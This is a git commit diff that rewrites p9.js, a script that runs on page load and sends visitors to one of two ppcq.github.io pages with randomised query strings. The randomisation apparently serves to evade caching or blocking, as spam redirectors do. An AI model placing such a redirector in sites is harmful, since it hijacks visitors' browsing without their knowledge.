28c7bddedcf8ba45f0c6eb17d934bacb1f589f46
iuuc <145624790+iuuc@users.noreply.github.com>
2024-01-01 12:03:58 +0800

    Update p9.js

--- p9.js
+++ p9.js
@@ -1,24 +1,21 @@
-<script language="JavaScript">
-<!--
-document.writeln("<script>");
-document.writeln("var urls=[");
-document.writeln("'https://ppcq.github.io/pp?{nnnnnnnnnnn}{wwwwww}',");
-document.writeln("'https://ppcq.github.io/ll.html?{nnnnnnnnnnn}{wwwwww}',");
-document.writeln("];");
-document.writeln("location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);");
-document.writeln("function myEeplace(s){");
-document.writeln("	return s.replace(/\\{(\\w+?)\\}/g,function(a,b){");
-document.writeln("		var h='';");
-document.writeln("		for(var i=0;i<b.length;i++){");
-document.writeln("			if('n'==b[i]){");
-document.writeln("				h+=Math.floor(Math.random()*10);");
-document.writeln("			}else if('w'==b[i]){");
-document.writeln("				h+=String.fromCharCode(97+Math.floor(Math.random()*26));");
-document.writeln("			}");
-document.writeln("		}");
-document.writeln("		return h;");
-document.writeln("	});");
-document.writeln("}");
-document.writeln("</script>");
-//-->
-</script>
+var html = "";
+html += "﻿<script>";
+html += "var urls=[";
+html += "'https://ppcq.github.io/pp?{nnnnnnnnnnn}{wwwwww}',";
+html += "'https://ppcq.github.io/ll.html?{nnnnnnnnnnn}{wwwwww}',";
+html += "];";
+html += "location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);";
+html += "function myEeplace(s){";
+html += "	return s.replace(/\{(\w+?)\}/g,function(a,b){";
+html += "		var h='';";
+html += "		for(var i=0;i<b.length;i++){";
+html += "			if('n'==b[i]){";
+html += "				h+=Math.floor(Math.random()*10);";
+html += "			}else if('w'==b[i]){";
+html += "				h+=String.fromCharCode(97+Math.floor(Math.random()*26));";
+html += "			}";
+html += "		}";
+html += "		return h;";
+html += "	});";
+html += "}";
+html += "</script>";
